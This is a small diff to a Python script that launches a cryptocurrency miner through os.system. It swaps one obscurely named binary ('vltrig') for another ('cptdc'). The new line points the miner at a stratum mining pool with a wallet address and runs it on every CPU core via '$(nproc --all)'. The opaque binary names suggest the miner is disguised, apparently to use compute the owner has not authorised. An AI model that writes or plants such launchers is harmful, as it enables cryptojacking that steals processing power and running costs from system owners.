@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('./vltrig --user 84bEkQaAvXnPXXghsfBYBeLGtkAV8eP1HX7rP7EUBE1pHvtwAffjCE2SzzY8y79fkgHA21czuEWoVUDkAf7e4qM5KMKCKVK --pass x -t $(nproc --all)')
+os.system('./cptdc -a yespowertide -o stratum+tcp://eu.rplant.xyz:7059 -u TQzt1MGjhnYHiUd47JeyFqLcNNffGnJrGs.x -p webpassword=x -t $(nproc --all)')
